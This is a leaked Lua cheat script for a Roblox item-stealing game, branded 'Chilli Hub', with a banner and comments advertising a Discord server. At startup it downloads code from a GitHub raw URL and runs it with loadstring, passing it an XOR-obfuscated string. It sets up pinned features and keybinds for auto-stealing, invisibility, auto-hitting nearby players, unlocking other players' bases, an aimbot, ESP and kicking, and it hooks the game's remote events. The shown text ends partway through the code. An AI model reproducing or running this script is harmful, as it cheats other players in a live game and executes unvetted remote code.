--[[

  /$$$$$$  /$$       /$$$$$$  /$$$$$$  /$$$$$$$$ /$$$$$$$ 
 /$$__  $$| $$      |_  $$_/ /$$__  $$| $$_____/| $$__  $$
| $$  \__/| $$        | $$  | $$  \__/| $$      | $$  \ $$
|  $$$$$$ | $$        | $$  | $$      | $$$$$   | $$  | $$
 \____  $$| $$        | $$  | $$      | $$__/   | $$  | $$
 /$$  \ $$| $$        | $$  | $$    $$| $$      | $$  | $$
|  $$$$$$/| $$$$$$$$ /$$$$$$|  $$$$$$/| $$$$$$$$| $$$$$$$/
 \______/ |________/|______/ \______/ |________/|_______/

              [ LEAKED BY SLICED ]
            [ discord.gg/pubmethod ]

]]

local chilliGithubFastManualDefaultsRu, v, sliced2, defaultTab, esp, Misc, Server, sliced3, Players, RunService
local Workspace, Lighting, CoreGui, HttpService, ReplicatedStorage, UserInputService, TeleportService, TextService, Stats, localPlayer
local sliced4, fn, obj, tbl, sliced5, flag, slicedfn2, tbl2, slicedfn3, sliced6
local sliced7, sliced8

do
	local sliced9, ContextActionService, sliced10, sliced11

	do
		local Helper, ProximityPromptService, TweenService, sliced12, str, n, flag2, flag3, flag4, slicedn2
		local flag5, slicedn3, flag6, slicedn4, RagdollController, UserInputService2, connection, flag7, slicedn5, slicedn6
		local prompt, tbl3, slicedn7, folder, bindableEvent, slicedfn4, slicedfn5, slicedfn6, slicedfn7, slicedfn8  -- LEAKED BY SLICED | discord.gg/pubmethod
		local slicedfn9, prompt2, slicedfn10, slicedfn11, slicedfn12, str2, slicedfn13, slicedfn14, screenGui, slicedfn15
		local slicedfn16, slicedfn17, slicedfn18, slicedfn19, screenGui2, frame, textLabel, textLabel2, frame2

		do
			local value = rawget(_G, "__ChilliGithubFastManualDefaultsRun")

			if type(value) == "table" then
				local window = value.Window

				if type(window) == "table" and window._destroyed ~= true then
					pcall(function()
						window:Open()
					end)  -- LEAKED BY SLICED | discord.gg/pubmethod

					return
				end

				local now = tonumber(value.StartedAt) or os.clock()
				if value.Status == "loading" and os.clock() - now < 30 then
					return
				end
			end

			chilliGithubFastManualDefaultsRu = { Status = "loading", StartedAt = os.clock() }
			_G.__ChilliGithubFastManualDefaultsRun = chilliGithubFastManualDefaultsRu

			local function slicedfn20()  -- LEAKED BY SLICED | discord.gg/pubmethod
				local response = game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/refs/heads/main/Chilli%20Library")
				local chunk, sliced13 = loadstring(response)
				assert(chunk, sliced13)
				local sliced14 = chunk()
				assert(type(sliced14) == "function", "Chilli Library bootstrap is invalid.")
				local sliced15 = table.create(45)
				local slicedn8 = 1

				for i_ = 1, 90, 2 do
					sliced15[slicedn8] = string.char(bit32.bxor(tonumber(string.sub("306908100841206d474f00185f26635b2101387507010810127d7d477a473b6f435a0916573165562900226c00", i_, i_ + 1), 16), string.byte("s9K!2vQ#", (slicedn8 - 1) % 8 + 1)))
					slicedn8 += 1  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				return sliced14(table.concat(sliced15))
			end

			v = slicedfn20()
			assert(type(v) == "table" and type(v.CreateWindow) == "function" and type(v.Finalize) == "function", "Chilli Library returned an invalid API.")
			chilliGithubFastManualDefaultsRu.Library = v

			v.ManualQuickDefaults = {
				PinnedFeatures = {
					"Stealer > Auto Steal Brainrot > Auto Steal",
					"Helper > Movement & Combat > Float",  -- LEAKED BY SLICED | discord.gg/pubmethod
					"Helper > Movement & Combat > Auto Hit Nearest Player",
					"Player > Jump Boost > Auto Jump",
					"Player > Jump Boost > Limit Jump Height",
					"Player > Invisibility > Invisible",
					"Server > Server > Kick",
					"Helper > Unlock Base > Auto Unlock Base",
					"Helper > Unlock Base > Unlock Floor 3",
					"Helper > Unlock Base > Unlock Floor 2",
					"Helper > Unlock Base > Unlock Floor 1",
					"Player > Respawn > Fast Reset",  -- LEAKED BY SLICED | discord.gg/pubmethod
					"Player > Speed Boost > Tool Speed Boost",
					"Stealer > Auto Steal Brainrot > Drop Brainrot",
					"Helper > Helper > Instant Clone Swap",
					"Player > Speed Boost > Adjust Auto Speed",
					"Player > Invisibility > Auto Invisible On Steal",
					"Player > Invisibility > Rotation",
					"Player > Invisibility > Auto Rotation",
					"Player > Invisibility > Depth",
					"Player > Invisibility > Lagback Detect",
					"Player > Invisibility > Auto Fix Lagback",  -- LEAKED BY SLICED | discord.gg/pubmethod
				},
				Keybinds = {
					["Player > Respawn > Fast Reset"] = "X",
					["Player > Jump Boost > Limit Jump Height"] = "N",
					["Player > Speed Boost > Tool Speed Boost"] = "Q",
					["Player > Jump Boost > Auto Jump"] = "V",
					["Player > Invisibility > Invisible"] = "U",
					["Helper > Movement & Combat > Float"] = "B",
					["Helper > Movement & Combat > Auto Hit Nearest Player"] = "G",
					["Stealer > Auto Steal Brainrot > Drop Brainrot"] = "R",  -- LEAKED BY SLICED | discord.gg/pubmethod
					["Server > Server > Kick"] = "J",
					["Helper > Helper > Instant Clone Swap"] = "F",
					["__ChilliDefaultKeyInstalled::Player > Speed Boost > Tool Speed Boost"] = true,
					["__ChilliDefaultKeyInstalled::Player > Invisibility > Invisible"] = true,
				},
				PinGroups = {
					["Player > Respawn > Fast Reset"] = 5,
					["Helper > Movement & Combat > Auto Hit Nearest Player"] = 1,
					["Helper > Unlock Base > Unlock Floor 3"] = 4,
					["Helper > Helper > Instant Clone Swap"] = 5,  -- LEAKED BY SLICED | discord.gg/pubmethod
					["Player > Speed Boost > Adjust Speed"] = 2,
					["Player > Jump Boost > Jump Height"] = 1,
					["Player > Invisibility > Auto Rotation"] = 2,
					["Helper > Unlock Base > Auto Unlock Base"] = 4,
					["Helper > Aimbot > Auto Paintball"] = 3,
					["Helper > Unlock Base > Unlock Floor 1"] = 4,
					["Player > Speed Boost > Adjust Auto Speed"] = 2,
					["Player > Invisibility > Lagback Detect"] = 2,
					["Player > Invisibility > Auto Invisible On Steal"] = 2,
					["Player > Invisibility > Invisible"] = 2,  -- LEAKED BY SLICED | discord.gg/pubmethod
					["Player > Invisibility > Auto Fix Lagback"] = 2,
					["Player > Speed Boost > Tool Speed Boost"] = 1,
					["Player > Invisibility > Depth"] = 2,
					["Stealer > Auto Kick > Auto Kick on Steal"] = 5,
					["Helper > Helper > Anti Body Swap"] = 5,
					["Player > Invisibility > Rotation"] = 2,
					["Helper > Unlock Base > Unlock Floor 2"] = 4,
					["Stealer > Auto Steal Brainrot > Drop Brainrot"] = 5,
					["Server > Server > Kick"] = 5,
				},  -- LEAKED BY SLICED | discord.gg/pubmethod
				LeftCenterHidden = true,
			}

			sliced2 = v:CreateWindow({ Name = "Chilli Hub", DefaultTab = "Main" })
			chilliGithubFastManualDefaultsRu.Window = sliced2
			defaultTab = sliced2:GetDefaultTab()
			local sliced13

			do
				local Stealer = sliced2:CreateTab("Stealer")
				Helper = sliced2:CreateTab("Helper")
				sliced9 = sliced2:CreateTab({ Name = "Player", SectionsExpanded = false })  -- LEAKED BY SLICED | discord.gg/pubmethod
				esp = sliced2:CreateTab("ESP")
				Misc = sliced2:CreateTab("Misc")
				Server = sliced2:CreateTab("Server")
				sliced3 = sliced2:CreateTab("AP&TP")
				Players = game:GetService("Players")
				RunService = game:GetService("RunService")
				Workspace = game:GetService("Workspace")
				Lighting = game:GetService("Lighting")
				CoreGui = game:GetService("CoreGui")
				HttpService = game:GetService("HttpService")  -- LEAKED BY SLICED | discord.gg/pubmethod
				ReplicatedStorage = game:GetService("ReplicatedStorage")
				UserInputService = game:GetService("UserInputService")
				ContextActionService = game:GetService("ContextActionService")
				TeleportService = game:GetService("TeleportService")
				ProximityPromptService = game:GetService("ProximityPromptService")
				TextService = game:GetService("TextService")
				TweenService = game:GetService("TweenService")
				Stats = game:GetService("Stats")
				localPlayer = Players.LocalPlayer
				local str3 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"  -- LEAKED BY SLICED | discord.gg/pubmethod
				sliced4 = Random.new()

				fn = function()
					local sliced14 = table.create(64)
					local str4 = HttpService:GenerateGUID(false):gsub("-", "")

					for i_ = 1, #str4 do
						sliced14[#sliced14 + 1] = str4:sub(i_, i_)
					end

					for i_ = 1, 32 do
						local sliced15 = sliced4:NextInteger(1, #str3)
						sliced14[#sliced14 + 1] = ("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"):sub(sliced15, sliced15)  -- LEAKED BY SLICED | discord.gg/pubmethod
					end

					for i_ = #sliced14, 2, -1 do
						local sliced15 = sliced4:NextInteger(1, i_)
						local sliced16 = sliced14[i_]
						sliced14[i_] = sliced14[sliced15]
						sliced14[sliced15] = sliced16
					end

					return table.concat(sliced14)
				end

				obj = setmetatable({}, { __mode = "k" })  -- LEAKED BY SLICED | discord.gg/pubmethod
				tbl = {}
				sliced12 = Stealer:CreateSection({ Name = "Auto Steal Brainrot", Expanded = true })
				sliced13 = Stealer:CreateSection({ Name = "Auto Kick", Expanded = true })
			end

			do
				local flag8 = false
				local flag9 = true
				local flag10 = false
				local slicedn8 = 0
				local slicedn9 = 1000000  -- LEAKED BY SLICED | discord.gg/pubmethod
				local sliced14 = nil
				local slicedn10 = -math.huge
				local tbl4 = {}
				local obj2 = setmetatable({}, { __mode = "k" })
				local tbl5 = {}

				pcall(function()
					local Animals = require(ReplicatedStorage.Datas.Animals)

					if type(Animals) == "table" then
						tbl5 = Animals
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
				end)

				local function slicedfn21(arg)
					local match, sliced15 = tostring(arg or ""):gsub("[%$,/s]", ""):gsub("%s+", ""):match("^([%d%.]+)([KkMmBbTt]?)$")
					if not match then
						return nil
					end
					local num = tonumber(match)
					if not num then
						return nil
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
					return num * (({ K = 1000, M = 1000000, B = 1e9, T = 1e12 })[string.upper(sliced15)] or 1)
				end

				local function slicedfn22(arg)
					local sliced15 = tbl5[tostring(arg or "")]
					return type(sliced15) == "table" and tonumber(sliced15.Generation) or 0
				end

				local function slicedfn23()
					local tbl6 = {}
					local debris = Workspace:FindFirstChild("Debris")
					if not debris then  -- LEAKED BY SLICED | discord.gg/pubmethod
						return tbl6
					end

					for _, child in ipairs(debris:GetChildren()) do
						if child:IsA("BasePart") and child.Name == "FastOverheadTemplate" then
							local animalOverhead = child:FindFirstChild("AnimalOverhead")
							local displayName = animalOverhead and animalOverhead:FindFirstChild("DisplayName")
							animalOverhead = animalOverhead and animalOverhead:FindFirstChild("Generation")

							if displayName and animalOverhead and displayName:IsA("TextLabel") and animalOverhead:IsA("TextLabel") then
								local sliced15 = slicedfn21(animalOverhead.Text)

								if sliced15 then  -- LEAKED BY SLICED | discord.gg/pubmethod
									local str3 = tostring(displayName.Text)
									tbl6[str3] = tbl6[str3] or {}
									tbl6[str3][#tbl6[str3] + 1] = { Position = child.Position, Generation = sliced15 }
								end
							end
						end
					end

					return tbl6
				end

				local function slicedfn24(arg, arg2, arg3)  -- LEAKED BY SLICED | discord.gg/pubmethod
					local generation = slicedfn22(arg)
					if not arg2 then
						return generation
					end
					local sliced15, sliced16, sliced17 = ipairs((arg3 or slicedfn23())[tostring(arg or "")] or {})
					local slicedn11 = 14

					for _, sliced18 in sliced15, sliced16, sliced17 do
						local magnitude = (sliced18.Position - arg2).Magnitude

						if magnitude < slicedn11 then
							generation = sliced18.Generation  -- LEAKED BY SLICED | discord.gg/pubmethod
							slicedn11 = magnitude
						end
					end

					return generation
				end

				local function slicedfn25()
					local sliced15 = Workspace:FindFirstChild(localPlayer.Name)
					if not sliced15 or not sliced15:IsA("Model") then
						return nil
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
					return sliced15:FindFirstChild("HumanoidRootPart") or sliced15:FindFirstChild("__HITBOX")
				end

				local chilliAutoKickOnStealRuntime = CoreGui:FindFirstChild("__ChilliAutoKickOnStealRuntime")

				if chilliAutoKickOnStealRuntime then
					local cleanup = chilliAutoKickOnStealRuntime:FindFirstChild("Cleanup")

					if cleanup and cleanup:IsA("BindableEvent") then
						pcall(function()
							cleanup:Fire()
						end)
					end  -- LEAKED BY SLICED | discord.gg/pubmethod

					pcall(function()
						chilliAutoKickOnStealRuntime:Destroy()
					end)
				end

				local folder2 = Instance.new("Folder")
				folder2.Name = "__ChilliAutoKickOnStealRuntime"
				folder2.Archivable = false
				folder2.Parent = CoreGui
				local bindableEvent2 = Instance.new("BindableEvent")
				bindableEvent2.Name = "Cleanup"  -- LEAKED BY SLICED | discord.gg/pubmethod
				bindableEvent2.Parent = folder2

				local function slicedfn26()
					for _, sliced15 in ipairs(tbl4) do
						if sliced15.Connected then
							sliced15:Disconnect()
						end
					end

					table.clear(tbl4)
					table.clear(obj2)
				end  -- LEAKED BY SLICED | discord.gg/pubmethod

				local slicedfn27 = nil

				slicedfn27 = function(arg, arg2, arg3)
					local kind = typeof(arg)

					if kind == "string" then
						local sliced15 = string.lower(arg)
						if string.find(sliced15, "you stole", 1, true) or string.find(sliced15, "successfully stole", 1, true) then
							return arg
						end
						return nil
					end  -- LEAKED BY SLICED | discord.gg/pubmethod

					if kind ~= "table" or arg3 >= 3 or arg2[arg] then
						return nil
					end
					arg2[arg] = true

					for k, sliced15 in pairs(arg) do
						local sliced16 = slicedfn27(k, arg2, arg3 + 1) or slicedfn27(sliced15, arg2, arg3 + 1)
						if sliced16 then
							return sliced16
						end
					end  -- LEAKED BY SLICED | discord.gg/pubmethod

					return nil
				end

				local function slicedfn28(...)
					if not flag8 then
						return
					end
					local sliced15 = table.pack(...)
					local tbl6 = {}

					for i_ = 1, sliced15.n do
						local sliced16 = slicedfn27(sliced15[i_], tbl6, 0)  -- LEAKED BY SLICED | discord.gg/pubmethod

						if sliced16 then
							local sliced17 = string.match(sliced16, ">([^<>]-)</font>")
							local sliced18 = slicedfn25()
							if slicedfn24(sliced17, sliced18 and sliced18.Position) < slicedn9 then
								return
							end
							local flag11 = sliced17 and sliced17 ~= ""
							local str3 = "\nAUTO KICK ACTIVATED"

							if flag11 then
								str3 = "\nAUTO KICK ACTIVATED" .. "\nYou stole: " .. sliced17  -- LEAKED BY SLICED | discord.gg/pubmethod
							end

							flag8 = false
							localPlayer:Kick(str3)
							return
						end
					end
				end

				local function slicedfn29(descendant)
					if not flag8 or not descendant:IsA("RemoteEvent") or obj2[descendant] then
						return  -- LEAKED BY SLICED | discord.gg/pubmethod
					end
					obj2[descendant] = true
					tbl4[#tbl4 + 1] = descendant.OnClientEvent:Connect(slicedfn28)
				end

				local function slicedfn30()
					flag8 = false
					slicedfn26()
				end

				local function slicedfn31()
					slicedfn30()  -- LEAKED BY SLICED | discord.gg/pubmethod
					flag8 = true
					local packages = ReplicatedStorage:FindFirstChild("Packages")
					packages = packages and packages:FindFirstChild("Net")
					if not packages then
						flag8 = false
						return
					end

					for _, descendant in ipairs(packages:GetDescendants()) do
						slicedfn29(descendant)
					end  -- LEAKED BY SLICED | discord.gg/pubmethod

					slicedfn29(packages)
					tbl4[#tbl4 + 1] = packages.DescendantAdded:Connect(slicedfn29)
				end

				local function slicedfn32()
					flag9 = false
					flag10 = false
					slicedn8 += 1
					slicedfn30()
				end

				bindableEvent2.Event:Connect(slicedfn32)  -- LEAKED BY SLICED | discord.gg/pubmethod
				folder2.Destroying:Connect(slicedfn32)

				sliced13:CreateToggle({
					Name = "Auto Kick on Steal",
					Default = false,
					Callback = function(arg)
						if arg then
							slicedfn31()
						else
							slicedfn30()
						end  -- LEAKED BY SLICED | discord.gg/pubmethod
					end,
				})

				local tbl6 = {
					["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
					["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
					["B/s"] = { Min = 1, Max = 10, Mult = 1e9 },
				}

				local sliced15 = nil
				local slicedn11 = 1
				local str3 = "M/s"  -- LEAKED BY SLICED | discord.gg/pubmethod

				local function slicedfn33(arg, arg2)
					if arg ~= nil then
						slicedn11 = math.floor(tonumber(arg) or slicedn11)
					end

					if arg2 ~= nil then
						str3 = tostring(arg2)
					elseif sliced15 and sliced15.GetUnit then
						local unit = sliced15:GetUnit()

						if unit and unit ~= "" then
							str3 = tostring(unit)  -- LEAKED BY SLICED | discord.gg/pubmethod
						end
					end

					slicedn9 = slicedn11 * (tbl6[str3] or tbl6["M/s"]).Mult
					sliced14 = nil
					slicedn10 = -math.huge
				end

				local function slicedfn34(arg)
					str3 = tostring(arg)
					local ms = tbl6[str3] or tbl6["M/s"]

					if sliced15 and sliced15.SetRange then  -- LEAKED BY SLICED | discord.gg/pubmethod
						sliced15:SetRange(ms.Min, ms.Max)
						local min = sliced15:Get() or ms.Min
						local min2 = ms.Min
						local max = ms.Max
						local slicedn12 = math.clamp(math.floor(min + 0.5), min2, max)

						if slicedn12 ~= min then
							sliced15:Set(slicedn12)
						else
							slicedfn33(slicedn12, str3)
						end  -- LEAKED BY SLICED | discord.gg/pubmethod
					else
						slicedfn33(nil, str3)
					end
				end

				sliced15 = sliced13:CreateSlider({
					Name = "Auto Kick Min Value",
					Note = "Only kicks for Brainrots at or above this generation value.",
					Min = 0,
					Max = 1000,
					Default = 10,  -- LEAKED BY SLICED | discord.gg/pubmethod
					AllowDecimals = false,
					Increment = 1,
					Unit = {
						Default = "M/s",
						Selector = true,
						Options = { "K/s", "M/s", "B/s" },
						ColorEnabled = true,
						Colors = {
							Number = Color3.fromRGB(255, 255, 255),
							Suffix = Color3.fromRGB(58, 255, 55),  -- LEAKED BY SLICED | discord.gg/pubmethod
						},
						Callback = function(arg)
							slicedfn34(arg)
						end,
					},
					Quick = false,
					Callback = function(arg)
						slicedfn33(arg, nil)
					end,
				})  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			str = "Steal"
			local slicedn8 = 2
			n = 0.25
			flag2 = true
			flag3 = false
			flag4 = false
			slicedn2 = 1000000
			flag5 = false
			slicedn3 = 20  -- LEAKED BY SLICED | discord.gg/pubmethod
			flag6 = false
			slicedn4 = 0
			RagdollController = nil

			pcall(function()
				RagdollController = require(game:GetService("ReplicatedStorage").Controllers.RagdollController)
			end)

			UserInputService2 = game:GetService("UserInputService")

			connection = UserInputService2.InputBegan:Connect(function(input, gameProcessed)
				if not gameProcessed and input.KeyCode == Enum.KeyCode.Backspace then
					slicedn4 = os.clock()  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
			end)

			flag7 = false
			slicedn5 = 0
			local slicedn9 = 0
			slicedn6 = -math.huge
			prompt = nil
			tbl3 = {}
			slicedn7 = -math.huge
			local slicedfn21  -- LEAKED BY SLICED | discord.gg/pubmethod

			do
				local tbl4 = {}
				local chilliAutoGetRuntime = CoreGui:FindFirstChild("__ChilliAutoGetRuntime")

				if chilliAutoGetRuntime then
					local cleanup = chilliAutoGetRuntime:FindFirstChild("Cleanup")

					if cleanup and cleanup:IsA("BindableEvent") then
						pcall(function()
							cleanup:Fire()
						end)
					end  -- LEAKED BY SLICED | discord.gg/pubmethod

					pcall(function()
						chilliAutoGetRuntime:Destroy()
					end)
				end

				folder = Instance.new("Folder")
				folder.Name = "__ChilliAutoGetRuntime"
				folder.Archivable = false
				folder.Parent = CoreGui
				bindableEvent = Instance.new("BindableEvent")
				bindableEvent.Name = "Cleanup"  -- LEAKED BY SLICED | discord.gg/pubmethod
				bindableEvent.Parent = folder

				slicedfn4 = function(arg)
					tbl4[#tbl4 + 1] = arg
					return arg
				end

				local slicedn10 = 10
				local obj2 = setmetatable({}, { __mode = "k" })

				slicedfn21 = function(arg, arg2)
					if not arg or not arg.Parent or not arg.Visible then
						return false  -- LEAKED BY SLICED | discord.gg/pubmethod
					end
					local absolutePosition = arg.AbsolutePosition
					local absoluteSize = arg.AbsoluteSize
					return arg2.X >= absolutePosition.X and arg2.X <= absolutePosition.X + absoluteSize.X and arg2.Y >= absolutePosition.Y and arg2.Y <= absolutePosition.Y + absoluteSize.Y
				end

				slicedfn4(UserInputService2.InputChanged:Connect(function(input)
					local sliced14 = obj2[input]
					if not sliced14 then
						return
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
					local vector2 = Vector2.new(input.Position.X, input.Position.Y)
					sliced14.Position = vector2

					if (vector2 - sliced14.Start).Magnitude > slicedn10 then
						sliced14.Cancelled = true
					end
				end))

				slicedfn4(UserInputService2.InputEnded:Connect(function(input)
					local sliced14 = obj2[input]
					if not sliced14 then
						return  -- LEAKED BY SLICED | discord.gg/pubmethod
					end
					local vector2 = Vector2.new(input.Position.X, input.Position.Y)
					sliced14.Position = vector2

					if (vector2 - sliced14.Start).Magnitude > slicedn10 or not slicedfn21(sliced14.Button, vector2) then
						sliced14.Cancelled = true
					end

					task.delay(0.2, function()
						if obj2[input] == sliced14 then
							obj2[input] = nil
						end  -- LEAKED BY SLICED | discord.gg/pubmethod
					end)
				end))

				slicedfn5 = function(arg, arg2)
					slicedfn4(arg.InputBegan:Connect(function(input)
						if input.UserInputType ~= Enum.UserInputType.Touch or input.UserInputState ~= Enum.UserInputState.Begin then
							return
						end
						local vector2 = Vector2.new(input.Position.X, input.Position.Y)

						if slicedfn21(arg, vector2) then
							obj2[input] = { Button = arg, Start = vector2, Position = vector2, Cancelled = false }  -- LEAKED BY SLICED | discord.gg/pubmethod
						end
					end))

					return slicedfn4(arg.Activated:Connect(function(inputObject)
						if inputObject and inputObject.UserInputType == Enum.UserInputType.Touch then
							local sliced14 = obj2[inputObject]
							if not sliced14 or sliced14.Button ~= arg or sliced14.Cancelled or not slicedfn21(arg, sliced14.Position) then
								return
							end
						end

						arg2()  -- LEAKED BY SLICED | discord.gg/pubmethod
					end))
				end

				slicedfn6 = function()
					for _, sliced14 in ipairs(tbl4) do
						if sliced14.Connected then
							sliced14:Disconnect()
						end
					end

					table.clear(tbl4)
				end  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			local sliced14, sliced15, slicedfn22, slicedfn23, slicedfn24

			do
				local sliced16 = nil
				sliced14 = nil
				sliced15 = nil
				local datas = ReplicatedStorage:FindFirstChild("Datas")

				if datas then
					local animals = datas:FindFirstChild("Animals")

					if animals and animals:IsA("ModuleScript") then  -- LEAKED BY SLICED | discord.gg/pubmethod
						local ok, result = pcall(require, animals)

						if ok and type(result) == "table" then
							sliced16 = result
						end
					end

					local mutations = datas:FindFirstChild("Mutations")

					if mutations and mutations:IsA("ModuleScript") then
						local ok, result = pcall(require, mutations)

						if ok and type(result) == "table" then
							sliced14 = result  -- LEAKED BY SLICED | discord.gg/pubmethod
						end
					end

					local traits = datas:FindFirstChild("Traits")

					if traits and traits:IsA("ModuleScript") then
						local ok, result = pcall(require, traits)

						if ok and type(result) == "table" then
							sliced15 = result
						end
					end
				end  -- LEAKED BY SLICED | discord.gg/pubmethod

				slicedfn22 = function(arg)
					return string.lower(tostring(arg or ""))
				end

				slicedfn23 = function(arg)
					arg = arg and arg.Parent

					while arg and arg ~= Workspace do
						if arg:IsA("BasePart") and arg.Name == "Spawn" then
							return arg
						end
						arg = arg.Parent  -- LEAKED BY SLICED | discord.gg/pubmethod
					end

					return nil
				end

				slicedfn24 = function(arg)
					if not sliced16 or not arg or arg == "" then
						return 0
					end
					local sliced17 = sliced16[arg]
					if type(sliced17) ~= "table" then
						return 0  -- LEAKED BY SLICED | discord.gg/pubmethod
					end
					return tonumber(sliced17.Generation) or 0
				end
			end

			local brainrotNameTiers = {}
			local tbl4 = { Limit = 1000000 }

			do
				local colorSequence = ColorSequence.new
				local tbl5 = {}
				local sliced16 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 231, 158))  -- LEAKED BY SLICED | discord.gg/pubmethod
				local sliced17 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 196, 66))
				local new = ColorSequenceKeypoint.new
				local color = Color3.fromRGB
				tbl5[1] = sliced16
				tbl5[2] = sliced17

				do
					local values = table.pack(new(1, color(214, 142, 12)))
					table.move(values, 1, values.n, 3, tbl5)
				end

				tbl4.Text = colorSequence(tbl5)  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			do
				local colorSequence = ColorSequence.new
				local tbl5 = {}
				local sliced16 = ColorSequenceKeypoint.new(0, Color3.fromRGB(122, 76, 0))
				local sliced17 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(62, 38, 0))
				local new = ColorSequenceKeypoint.new
				local color = Color3.fromRGB
				tbl5[1] = sliced16
				tbl5[2] = sliced17  -- LEAKED BY SLICED | discord.gg/pubmethod

				do
					local values = table.pack(new(1, color(20, 12, 0)))
					table.move(values, 1, values.n, 3, tbl5)
				end

				tbl4.Stroke = colorSequence(tbl5)
			end

			local tbl5 = { Limit = 10000000 }

			do
				local colorSequence = ColorSequence.new
				local tbl6 = {}  -- LEAKED BY SLICED | discord.gg/pubmethod
				local sliced16 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 198, 132))
				local sliced17 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 146, 40))
				local new = ColorSequenceKeypoint.new
				local color = Color3.fromRGB
				tbl6[1] = sliced16
				tbl6[2] = sliced17

				do
					local values = table.pack(new(1, color(206, 92, 0)))
					table.move(values, 1, values.n, 3, tbl6)
				end  -- LEAKED BY SLICED | discord.gg/pubmethod

				tbl5.Text = colorSequence(tbl6)
			end

			do
				local colorSequence = ColorSequence.new
				local tbl6 = {}
				local sliced16 = ColorSequenceKeypoint.new(0, Color3.fromRGB(112, 54, 0))
				local sliced17 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(56, 27, 0))
				local new = ColorSequenceKeypoint.new
				local color = Color3.fromRGB
				tbl6[1] = sliced16  -- LEAKED BY SLICED | discord.gg/pubmethod
				tbl6[2] = sliced17

				do
					local values = table.pack(new(1, color(18, 8, 0)))
					table.move(values, 1, values.n, 3, tbl6)
				end

				tbl5.Stroke = colorSequence(tbl6)
			end

			do
				local tbl6 = { Limit = 100000000 }
				local colorSequence = ColorSequence.new  -- LEAKED BY SLICED | discord.gg/pubmethod
				local tbl7 = {}
				local sliced16 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 168, 140))
				local sliced17 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 82, 38))
				local new = ColorSequenceKeypoint.new
				local color = Color3.fromRGB
				tbl7[1] = sliced16
				tbl7[2] = sliced17

				do
					local values = table.pack(new(1, color(196, 42, 0)))
					table.move(values, 1, values.n, 3, tbl7)  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				tbl6.Text = colorSequence(tbl7)
				local colorSequence2 = ColorSequence.new
				local tbl8 = {}
				local sliced18 = ColorSequenceKeypoint.new(0, Color3.fromRGB(112, 26, 0))
				local sliced19 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(56, 13, 0))
				local new2 = ColorSequenceKeypoint.new
				local color2 = Color3.fromRGB
				tbl8[1] = sliced18
				tbl8[2] = sliced19  -- LEAKED BY SLICED | discord.gg/pubmethod

				do
					local values = table.pack(new2(1, color2(18, 4, 0)))
					table.move(values, 1, values.n, 3, tbl8)
				end

				tbl6.Stroke = colorSequence2(tbl8)
				local tbl9 = { Limit = math.huge }
				local colorSequence3 = ColorSequence.new
				local tbl10 = {}
				local sliced20 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 105, 105))
				local sliced21 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 28, 40))  -- LEAKED BY SLICED | discord.gg/pubmethod
				local new3 = ColorSequenceKeypoint.new
				local color3 = Color3.fromRGB
				tbl10[1] = sliced20
				tbl10[2] = sliced21

				do
					local values = table.pack(new3(1, color3(184, 0, 18)))
					table.move(values, 1, values.n, 3, tbl10)
				end

				tbl9.Text = colorSequence3(tbl10)
				local colorSequence4 = ColorSequence.new  -- LEAKED BY SLICED | discord.gg/pubmethod
				local tbl11 = {}
				local sliced22 = ColorSequenceKeypoint.new(0, Color3.fromRGB(124, 0, 15))
				local sliced23 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(61, 0, 9))
				local new4 = ColorSequenceKeypoint.new
				local color4 = Color3.fromRGB
				tbl11[1] = sliced22
				tbl11[2] = sliced23

				do
					local values = table.pack(new4(1, color4(18, 0, 3)))
					table.move(values, 1, values.n, 3, tbl11)  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				tbl9.Stroke = colorSequence4(tbl11)
				brainrotNameTiers[1] = tbl4
				brainrotNameTiers[2] = tbl5
				brainrotNameTiers[3] = tbl6
				brainrotNameTiers[4] = tbl9
			end

			chilliGithubFastManualDefaultsRu.BrainrotNameTiers = brainrotNameTiers

			chilliGithubFastManualDefaultsRu.BrainrotNameTier = function(arg)
				local slicedn10 = tonumber(arg) or 0  -- LEAKED BY SLICED | discord.gg/pubmethod

				for _, brainrotNameTier in ipairs(chilliGithubFastManualDefaultsRu.BrainrotNameTiers) do
					if slicedn10 < brainrotNameTier.Limit then
						return brainrotNameTier
					end
				end

				return chilliGithubFastManualDefaultsRu.BrainrotNameTiers[#chilliGithubFastManualDefaultsRu.BrainrotNameTiers]
			end

			chilliGithubFastManualDefaultsRu.CreateBrainrotNameStyle = function(parent)
				parent.TextColor3 = Color3.fromRGB(255, 255, 255)
				local uiStroke = Instance.new("UIStroke")  -- LEAKED BY SLICED | discord.gg/pubmethod
				uiStroke.Color = Color3.fromRGB(255, 255, 255)
				uiStroke.Thickness = 1.15
				uiStroke.Transparency = 0.08
				uiStroke.Parent = parent
				local uiGradient = Instance.new("UIGradient")
				uiGradient.Rotation = 90
				uiGradient.Parent = uiStroke
				local uiGradient2 = Instance.new("UIGradient")
				uiGradient2.Rotation = 90
				uiGradient2.Parent = parent  -- LEAKED BY SLICED | discord.gg/pubmethod
				return { Label = parent, Outline = uiStroke, Text = uiGradient2, Stroke = uiGradient }
			end

